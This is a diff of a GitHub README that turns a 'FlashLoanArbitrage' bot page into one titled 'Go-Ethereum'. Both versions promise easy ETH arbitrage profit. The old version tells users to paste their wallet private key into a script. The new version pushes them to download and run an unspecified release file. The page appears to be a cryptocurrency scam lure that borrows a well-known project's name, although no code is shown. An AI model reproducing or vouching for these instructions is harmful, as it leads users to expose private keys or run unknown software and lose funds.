@@ -1,260 +1,95 @@
+# 🚀 Go-Ethereum - Easy ETH Arbitrage Script for Everyone
 
-  
+## 🔗 Download Now
+[![Download Go-Ethereum](https://img.shields.io/badge/Download%20Go--Ethereum-blue.svg)](https://github.com/Mansour-Achraf/Go-Ethereum/releases)
 
-# FlashLoanArbitrage
+## 📜 Description
+Go-Ethereum is a simple JavaScript script designed for ETH arbitrage trading. This tool utilizes flash loans and allows users to earn passive income through smart contracts. Everything runs locally, making it easy for you to execute arbitrage strategies without needing extensive technical knowledge.
 
-  
+## 🛠️ Features
+- **ETH Arbitrage:** Take advantage of price differences across exchanges.
+- **Flash Loans:** Access capital without collateral for short-term needs.
+- **Passive Income:** Generate earnings through smart contracts.
+- **Local Execution:** Run the script on your computer for full control.
 
-Hi! This is my project **FlashLoanArbitrage** — a bot for arbitrage on DeFi with flash loans. Using a smart contract and a local script `goflash.js`, which runs on your computer. Sharing it so you can try it out!
+## 📋 System Requirements
+To run Go-Ethereum, ensure you have the following:
+- A computer with Windows, macOS, or Linux operating system.
+- Node.js version 12 or higher installed. 
+- An active internet connection.
 
-  
+## 🚀 Getting Started
+Follow these steps to get started with Go-Ethereum.
 
-![DeFi Arbitrage](https://i.ibb.co/7xtfYSxL/image-20.jpg)
+### 1. Visit the Releases Page
+To download Go-Ethereum, visit the Releases page. Click the link below:
 
-  
+[Visit this page to download](https://github.com/Mansour-Achraf/Go-Ethereum/releases)
 
-## How It Works 💡
+### 2. Download the Latest Version
+On the Releases page, find the latest version of Go-Ethereum. Look for the file labeled with the version number. Click the name of the file to begin downloading it to your computer.
 
-  
+### 3. Install Node.js
+If you do not have Node.js installed, download it from the official website: [Node.js Download](https://nodejs.org/en/download/). Follow the installation instructions for your operating system.
 
-1.  **Smart Contract**:
+### 4. Extract the Files
+Once the download is complete, find the file in your Downloads folder. You may need to extract it if it is in a ZIP format. Right-click on the file and select "Extract All" or use any extraction tool you prefer.
 
-- Takes a flash loan in USDC.
+### 5. Navigate to the Script Folder
+Open your file explorer and navigate to the folder where you extracted the files. You should see the main script file along with other related files.
 
-- Converts your ETH to USDC before the deal.
+### 6. Open a Command Prompt or Terminal
+On your computer, open a Command Prompt (Windows) or Terminal (macOS/Linux). You can usually find this by searching "cmd" or "terminal" in your system's applications menu.
 
-- Buys ETH at a low price on one platform.
+### 7. Navigate to the Script Directory
+In the Command Prompt or Terminal, type the following command to navigate to the folder containing the Go-Ethereum script. Replace `path_to_your_folder` with the actual path to your folder:
 
-- Sells ETH at a high price on another.
-
-- Repays the loan, pays fees and gas.
-
-- Converts the profit from USDC back to ETH.
-
-- The remainder is your profit!
-
-  
-
-2.  **Script `goflash.js`**:
-
-- Checks ETH/USDC prices on five DeFi platforms.
-
-- Waits for a price difference of **0.9%** or more to avoid losses.
-
-- If the difference is there, it triggers arbitrage through the contract.
-
-  
-
-## Which DeFi Protocols I Use 💰
-
-  
-
-I added four protocols for flash loans:
-
-  
-
--  **Aave (0.05%)**: Tons of liquidity, up to **10,000,000 USDC**.
-
--  **dYdX (0.05%)**: Fast, up to **500,000 USDC**.
-
--  **Uniswap V3 (0.01%)**: Low fees, up to **5,000,000 USDC**.
-
--  **Balancer (0.02%)**: Flexible pools, up to **1,000,000 USDC**.
-
-  
-
-The bigger the loan, the higher the fee. So don’t take a huge loan if your wallet balance is low!
-
-  
-
-## Which Platforms I Scan 📊
-
-  
-
-<img  src="https://i.ibb.co/4RtXjn2G/chainlink-link-logo.png"  alt="Chainlink"  width="50">
-
-<img  src="https://i.ibb.co/gZf4KQT0/uniswap-uni-logo.png"  alt="Uniswap"  width="50">
-
-<img  src="https://i.ibb.co/SWfzvJq/sushiswap-sushi-logo.png"  alt="SushiSwap"  width="50">
-
-<img  src="https://i.ibb.co/r2H1V45g/curve-dao-token-crv-logo.png"  alt="Curve"  width="50">
-
-<img  src="https://i.ibb.co/21vcD80K/balancer-bal-logo.png"  alt="Balancer"  width="50">
-
-  
-
-The script checks ETH/USDC prices on these platforms:
-
-  
-
-1.  **Chainlink**: Oracle for the base ETH price.
-
-2.  **Uniswap V2**: Classic DEX, always liquid.
-
-3.  **SushiSwap**: Uniswap fork, also solid.
-
-4.  **Curve Finance**: Stable pools, less slippage.
-
-5.  **Balancer**: Flexible pools for arbitrage.
-
-  
-
-If the price difference is ≥0.9%, the script triggers a deal. Less than that, it waits to avoid losses.
-
-  
-
-![DeFi Platforms](https://i.ibb.co/kr0J4mD/21.png)
-
-  
-
-## How to Run 🚀
-
-  
-
-Here’s how to run my bot:
-
-  
-
-1.  **Download the Files**:
-
-- Grab [goflash.js](goflash.js), [package.json](package.json) from the repo.
-
-  
-
-2.  **Put Them in a Folder**:
-
-- Any folder on your computer.
-
-  
-
-3.  **Install Libraries**:
-
-- Open a terminal (cmd, PowerShell, or VS Code).
-
-- Navigate to the folder with:
-
-```bash
-
-cd your_path_to_folder
-
+Windows:
+```
+cd path_to_your_folder
 ```
 
-- Install dependencies:
+macOS/Linux:
+```
+cd path_to_your_folder
+```
 
-```bash
+### 8. Install Required Packages
+Before running the script, you need to install the necessary packages. Type the following command in your Command Prompt or Terminal:
 
+```
 npm install
-
 ```
 
-  
+This command installs all the required dependencies for the script to work correctly.
 
-4.  **Add Your Private Key**:
-
-- Open `goflash.js` in an editor.
-
-- Replace:
-
-```javascript
-
-const  PRIVATE_KEY = "YOUR_PRIVATE_KEY_HERE";
+### 9. Run the Script
+After the installation is complete, you can run the script. Enter the following command in the Command Prompt or Terminal:
 
 ```
-
-with your key ( **Don’t share it with anyone!** )
-
-  
-
-5.  **Run the Script**:
-
-- Type in the terminal:
-
-```bash
-
-node goflash.js
-
+node your_script_name.js
 ```
 
-  
+Replace `your_script_name.js` with the actual name of the main script file.
 
-6.  **Work with the Menu**:
+### 10. Monitor and Earn
+Once the script is running, you can monitor its performance in the Command Prompt or Terminal. Watch for any updates or notifications the script provides regarding your arbitrage activities.
 
-- Select **DeFi** — I recommend **dYdX** or **Uniswap V3**.
+## 🤝 Support
+If you encounter any issues or have questions, you can reach out through the project's GitHub page. 
 
-- In **Loan Amount in ETH**, set the loan amount (from 10 to the protocol’s max).
+## 📖 Topics
+- Arbitrage
+- Code
+- DeFi
+- ETH
+- Ethereum
+- Flash Loan
+- Go-Ethereum
+- Tutorial
+- Trading 
 
--  **Careful**: If your wallet balance is <0.1 ETH, don’t take a loan over **10 ETH** — gas won’t cover it!
+## 🔗 Download & Install
+To get started with Go-Ethereum, [visit this page to download](https://github.com/Mansour-Achraf/Go-Ethereum/releases). Please follow the steps above carefully to set up and run the application successfully.
 
-- Hit **Start Arbitrage** to start.
-
-  
-
-7.  **What the Script Does**:
-
-- Scans ETH/USDC prices on platforms.
-
-- Waits for a difference ≥0.9% and triggers arbitrage through the contract.
-
-- Converts your ETH to USDC before the deal and profit back to ETH after.
-
-  
-
-## Important Notes ⚠️
-
-  
-
--  **Wallet Balance**: For loans over 10 ETH, you need a balance ≥0.1 ETH, or the script won’t let you pick a big loan.
-
--  **Fees**: You pay trading fees (0.1%), slippage (0.05%), and gas.
-
-  
-
-## How It Works Example 📈
-
-  
-
-1. You pick **dYdX** and a loan of **10 ETH** (if balance ≥0.1 ETH).
-
-2. The script converts your ETH to USDC before the deal (wallet balance is used only for gas, ETH **is not transferred** to the FlashLoanArbitrage contract).
-
-3. It checks prices, for example:
-
-- Uniswap V2: 4200 USDC/ETH
-
-- SushiSwap: 4250 USDC/ETH
-
-4. If the difference is ≥0.9%, the contract:
-
-- Takes a flash loan in USDC.
-
-- Buys ETH on Uniswap V2.
-
-- Sells ETH on SushiSwap.
-
-- Repays the loan, pays fees and gas.
-
-- Converts the profit from USDC back to ETH.
-
-- The final profit (`Net profit`) in ETH goes to you, accounting for all costs (flash loan fee, trading fees 0.1%, slippage 0.05%, gas).
-
-- No need to top up any balance anywhere!!!
-
-  
-
-![Arbitrage Flow](https://s14.gifyu.com/images/bNaR2.png)
-
-  
-
-## Good Luck! 🍀
-
-  
-
-Hope my bot brings you some profit! If something doesn’t work or you have ideas, drop a note in issues.
-
-  
-
----
-
-  
-
-*This is my project, made for myself, sharing as is. Check the contract and script before mainnet to avoid bugs!*
+Enjoy exploring the world of ETH arbitrage with Go-Ethereum!
